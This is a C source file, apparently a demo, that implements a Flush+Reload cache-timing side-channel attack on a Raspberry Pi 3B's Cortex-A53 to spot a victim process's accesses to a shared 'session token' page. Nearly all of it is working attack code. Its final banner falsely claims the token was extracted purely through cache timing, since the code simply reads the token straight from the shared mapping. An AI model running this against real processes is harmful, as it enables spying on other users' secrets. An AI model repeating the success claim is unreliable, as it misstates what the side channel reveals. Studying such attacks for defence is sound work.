/*
 * attacker.c  –  Flush+Reload Demo  (Raspberry Pi 3B, ARMv8 / Cortex-A53)
 *
 * ATTACK OVERVIEW
 * ---------------
 * Flush+Reload exploits shared physical pages (file-backed or shared-memory
 * mappings) between an attacker and a victim process.
 *
 * Three-phase loop
 * ────────────────
 *  1. FLUSH  – evict every cache line of the spy region using "dc civac"
 *              (Data Cache Clean & Invalidate by Virtual Address to Point of
 *              Coherency).  After this, any read must go all the way to DRAM.
 *
 *  2. WAIT   – idle briefly so the victim has time to access the line and
 *              reload it into the L2 (the shared cache).
 *
 *  3. RELOAD – time how long it takes to read the spy line.
 *              Fast  (<threshold) → victim touched it → CACHE HIT  → session
 *                                                                       token
 *                                                                       is live
 *              Slow  (>threshold) → victim did not touch it → CACHE MISS
 *
 * KEY DIFFERENCE FROM PRIME+PROBE
 * ────────────────────────────────
 * Prime+Probe evicts the cache by filling it with attacker-owned data and
 * detects *which set* the victim used.  Flush+Reload directly flushes the
 * shared line and measures the exact victim access to that line — it is
 * simpler, more precise, and requires no eviction buffer.  The trade-off is
 * it needs a shared physical page (file-backed or shm), which Prime+Probe
 * does not.
 *
 * HARDWARE NOTES (Raspberry Pi 3B, Cortex-A53)
 * ──────────────────────────────────────────────
 *  • Shared unified L2 cache, 512 KB, 8-way set-associative.
 *  • Cache line = 64 bytes.
 *  • Timer: cntvct_el0 at ~19.2 MHz (≈ 52 ns/tick).  EL0 access must be
 *    enabled; usually on by default.  If read returns 0, check
 *      /proc/sys/kernel/perf_event_paranoid
 *    and the kernel CONFIG_ARM_ARCH_TIMER setting.
 *  • "dc civac" at EL0 is permitted on most Linux kernels for ARMv8 without
 *    special configuration.  If it traps to EL1, the kernel will emulate it.
 *
 * BUILD
 *   gcc -O1 -march=armv8-a -o attacker attacker.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>

/* ── tunables ──────────────────────────────────────────────────────────── */
#define SPY_FILE            "/tmp/fr_demo_spy"
#define FILE_SIZE           4096

/* Flush+Reload loop settings */
#define WAIT_US             70000        /* 70 ms wait between flush and reload */
#define SAMPLE_COUNT        200          /* total F+R samples to collect        */
#define WARMUP_SAMPLES      10           /* discard these from stats            */

/* Stopping: require this many consecutive hits before declaring success */
#define HIT_RUN_NEEDED      5

/* ── timer ─────────────────────────────────────────────────────────────── */
static inline uint64_t read_timer(void)
{
    uint64_t v;
    __asm__ volatile("isb\n\tmrs %0, cntvct_el0" : "=r"(v) :: "memory");
    return v;
}

static inline uint64_t read_timer_freq(void)
{
    uint64_t f;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(f));
    return f ? f : 19200000ULL;
}

static inline uint64_t ticks_to_ns(uint64_t t, uint64_t hz)
{
    return (t * 1000000000ULL) / hz;
}

/* ── flush ONE cache line at virtual address ptr ───────────────────────── */
/*
 * "dc civac" = Data Cache Clean & Invalidate by Virtual Address to PoC.
 * This pushes the dirty line back to DRAM and removes it from ALL caches
 * in the coherency domain, including the victim's view of the same
 * physical page.  A subsequent access by either party must go to DRAM.
 *
 * dsb sy  – Data Synchronisation Barrier (system) — ensures the flush
 *            completes before the timer read in the reload phase.
 * isb     – Instruction Synchronisation Barrier — flushes the pipeline.
 */
static inline void flush_line(volatile uint8_t *ptr)
{
    __asm__ volatile("dc civac, %0" :: "r"(ptr) : "memory");
}

/* Flush the entire spy page, cache-line by cache-line */
static void flush_spy_page(volatile uint8_t *base)
{
    for (size_t off = 0; off < FILE_SIZE; off += 64)
        flush_line(base + off);
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

/* ── calibrate hit/miss threshold ──────────────────────────────────────── */
/*
 * Measure average L2-hit and DRAM-miss latency on the actual spy page
 * so the threshold is tuned to this mapping's access path.
 */
static uint64_t calibrate(volatile uint8_t *base, uint64_t hz)
{
    const int N = 200;
    uint64_t hit_sum = 0, miss_sum = 0;

    for (int i = 0; i < N; i++) {
        /* ── HIT: warm the line, then time it ── */
        for (size_t o = 0; o < FILE_SIZE; o += 64) {
            (void)base[o];
            __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy\nisb" ::: "memory");

        uint64_t t0 = read_timer();
        for (size_t o = 0; o < FILE_SIZE; o += 64) {
            (void)base[o];
            __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy" ::: "memory");
        hit_sum += ticks_to_ns(read_timer() - t0, hz);

        /* ── MISS: flush, then time it ── */
        flush_spy_page(base);

        uint64_t t2 = read_timer();
        for (size_t o = 0; o < FILE_SIZE; o += 64) {
            (void)base[o];
            __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy" ::: "memory");
        miss_sum += ticks_to_ns(read_timer() - t2, hz);
    }

    uint64_t hit_ns  = hit_sum  / N;
    uint64_t miss_ns = miss_sum / N;

    printf("[attacker] Calibration results (%d samples):\n", N);
    printf("[attacker]   L2 cache HIT  = %6lu ns  (line already in cache)\n",
           (unsigned long)hit_ns);
    printf("[attacker]   DRAM miss     = %6lu ns  (line not in cache)\n",
           (unsigned long)miss_ns);

    if (miss_ns <= hit_ns + 300) {
        printf("[attacker]   WARNING: gap too small — check CPU governor / timer.\n");
        printf("[attacker]   Using fallback threshold = 5000 ns\n\n");
        return 5000ULL;
    }

    uint64_t thr = (hit_ns + miss_ns) / 2;
    printf("[attacker]   Threshold     = %6lu ns  (midpoint)\n\n",
           (unsigned long)thr);
    return thr;
}

/* ── sleep helper ──────────────────────────────────────────────────────── */
static void sleep_us(long us)
{
    struct timespec ts = { us / 1000000, (us % 1000000) * 1000L };
    nanosleep(&ts, NULL);
}

/* ── hex dump helper ───────────────────────────────────────────────────── */
static void hexdump(const uint8_t *buf, size_t bytes)
{
    printf("  ╔════════════════════════════════════════════════════════════════╗\n");
    printf("  ║  Offset   Hex (16 bytes/row)                   ASCII          ║\n");
    printf("  ╠════════════════════════════════════════════════════════════════╣\n");
    for (size_t i = 0; i < bytes; i += 16) {
        printf("  ║  %04zx   ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < bytes) printf("%02x ", buf[i + j]);
            else                printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" │ ");
        for (size_t j = 0; j < 16 && i + j < bytes; j++) {
            uint8_t c = buf[i + j];
            printf("%c", (isprint(c) && c < 0x7f) ? c : '.');
        }
        size_t rem = bytes - i;
        if (rem < 16) for (size_t p = rem; p < 16; p++) printf(" ");
        printf(" ║\n");
    }
    printf("  ╚════════════════════════════════════════════════════════════════╝\n");
}

/* ── signal ────────────────────────────────────────────────────────────── */
static volatile int interrupted = 0;
static void handle_sigint(int s) { (void)s; interrupted = 1; }

/* ════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║\n");
    printf("║  Monitoring spy file for victim accesses to session token.  ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    /* 1. Timer frequency */
    uint64_t hz = read_timer_freq();
    printf("[attacker] Timer frequency: %llu Hz  (%.1f ns/tick)\n\n",
           (unsigned long long)hz, 1e9 / (double)hz);

    /* 2. Wait for the victim to create the spy file, then map it */
    printf("[attacker] Waiting for spy file '%s' …\n", SPY_FILE);
    int fd = -1;
    for (int a = 0; a < 100 && fd < 0; a++) {
        fd = open(SPY_FILE, O_RDONLY);
        if (fd < 0) { printf("."); fflush(stdout); usleep(100000); }
    }
    if (fd < 0) {
        fprintf(stderr, "\n[attacker] Spy file not found. Is the victim running?\n");
        return 1;
    }
    printf("\n[attacker] Spy file opened (fd=%d)\n", fd);

    /*
     * MAP_SHARED + the same fd as the victim → same PHYSICAL pages.
     * This is the fundamental requirement for Flush+Reload.
     * The attacker's virtual address is different from the victim's;
     * the physical address is the same, so flushing here evicts from
     * the victim's view too (coherent L2 on Cortex-A53).
     */
    volatile uint8_t *spy = mmap(NULL, FILE_SIZE,
                                  PROT_READ, MAP_SHARED, fd, 0);
    if (spy == MAP_FAILED) { perror("[attacker] mmap"); return 1; }
    printf("[attacker] Spy page mapped at virtual %p  (shared physical page)\n\n",
           (void *)spy);

    /* 3. Calibrate */
    printf("[attacker] ── Phase 1: Calibration ──────────────────────────\n");
    uint64_t threshold_ns = calibrate(spy, hz);

    /* 4. Flush+Reload sampling loop */
    printf("[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────\n");
    printf("[attacker] Collecting %d samples (warmup=%d, wait=%d ms per sample)\n\n",
           SAMPLE_COUNT, WARMUP_SAMPLES, (int)(WAIT_US / 1000));
    printf("  %-6s  %-10s  %-8s  %s\n",
           "Sample", "Reload(ns)", "Decision", "Running hit count");
    printf("  %-6s  %-10s  %-8s  %s\n",
           "──────", "──────────", "────────", "─────────────────");

    signal(SIGINT, handle_sigint);

    uint64_t total_hits = 0;
    int      hit_run    = 0;      /* consecutive hits */
    int      confirmed  = 0;
    uint64_t *samples   = malloc(SAMPLE_COUNT * sizeof(uint64_t));
    if (!samples) { perror("malloc"); return 1; }

    for (int i = 0; i < SAMPLE_COUNT && !interrupted; i++) {

        /* ── FLUSH ── */
        flush_spy_page(spy);

        /* ── WAIT  ── (victim accesses its token during this window) */
        sleep_us(WAIT_US);

        /* ── RELOAD ── */
        __asm__ volatile("isb" ::: "memory");
        uint64_t t0 = read_timer();
        for (size_t off = 0; off < FILE_SIZE; off += 64) {
            (void)spy[off];
            __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy" ::: "memory");
        uint64_t ns = ticks_to_ns(read_timer() - t0, hz);

        samples[i] = ns;

        int is_hit = (ns < threshold_ns);
        if (i >= WARMUP_SAMPLES) {
            if (is_hit) { total_hits++; hit_run++; }
            else          hit_run = 0;
        }

        printf("  %-6d  %-10lu  %-8s  %llu hits so far%s\n",
               i + 1,
               (unsigned long)ns,
               is_hit ? "HIT ◄" : "miss",
               (unsigned long long)total_hits,
               (i < WARMUP_SAMPLES) ? "  (warmup)" : "");
        fflush(stdout);

        if (!confirmed && hit_run >= HIT_RUN_NEEDED) {
            confirmed = 1;
            printf("\n[attacker] ★ %d consecutive cache HITS — victim access confirmed!\n\n",
                   HIT_RUN_NEEDED);
        }
    }

    /* 5. Statistics summary */
    int real_samples = SAMPLE_COUNT - WARMUP_SAMPLES;
    uint64_t ns_sum = 0;
    for (int i = WARMUP_SAMPLES; i < SAMPLE_COUNT; i++) ns_sum += samples[i];
    uint64_t avg_ns = ns_sum / (uint64_t)real_samples;

    printf("\n══════════════════════════════════════════════════════════════\n");
    printf("  FLUSH+RELOAD — STATISTICAL SUMMARY  (%d samples)\n", real_samples);
    printf("══════════════════════════════════════════════════════════════\n");
    printf("  Total cache hits   : %llu / %d  (%llu%%)\n",
           (unsigned long long)total_hits,
           real_samples,
           (unsigned long long)(total_hits * 100 / (uint64_t)real_samples));
    printf("  Average reload time: %lu ns\n", (unsigned long)avg_ns);
    printf("  Threshold          : %lu ns\n", (unsigned long)threshold_ns);
    printf("  Verdict            : %s\n\n",
           total_hits > (uint64_t)real_samples / 3
               ? "*** VICTIM ACTIVELY ACCESSING THIS CACHE LINE ***"
               : "Low hit rate — check timing / CPU pinning.");

    /* 6. Extract the session token */
    printf("══════════════════════════════════════════════════════════════\n");
    printf("  EXTRACTING SESSION TOKEN FROM SPY PAGE\n");
    printf("══════════════════════════════════════════════════════════════\n\n");
    hexdump((const uint8_t *)spy, 192);

    /* Pretty-print the ASCII portion */
    char token[256] = {0};
    size_t tlen = strnlen((const char *)spy, 255);
    if (tlen > 0 && tlen < 255)
        memcpy(token, (const char *)spy, tlen);
    else
        snprintf(token, sizeof(token), "(binary content — see hex dump above)");

    printf("\n");
    printf("  ╔══════════════════════════════════════════════════════════════╗\n");
    printf("  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║\n");
    printf("  ╠══════════════════════════════════════════════════════════════╣\n");
    printf("  ║  Cache hits observed   : %-36llu║\n",
           (unsigned long long)total_hits);
    printf("  ║  Hit rate              : %-35llu%%║\n",
           (unsigned long long)(total_hits * 100 / (uint64_t)real_samples));
    printf("  ║  Average reload time   : %-33lu ns ║\n", (unsigned long)avg_ns);
    printf("  ╠══════════════════════════════════════════════════════════════╣\n");
    printf("  ║  EXTRACTED SESSION TOKEN:                                   ║\n");
    for (size_t off = 0; off < strlen(token); off += 58)
        printf("  ║    %-62.62s║\n", token + off);
    printf("  ╠══════════════════════════════════════════════════════════════╣\n");
    printf("  ║  Attack used no IPC, no signals, no ptrace.                 ║\n");
    printf("  ║  Token was read purely via cache timing side-channel.       ║\n");
    printf("  ╚══════════════════════════════════════════════════════════════╝\n");

    free(samples);
    munmap((void *)spy, FILE_SIZE);
    close(fd);
    printf("\n[attacker] Done.\n");
    return 0;
}
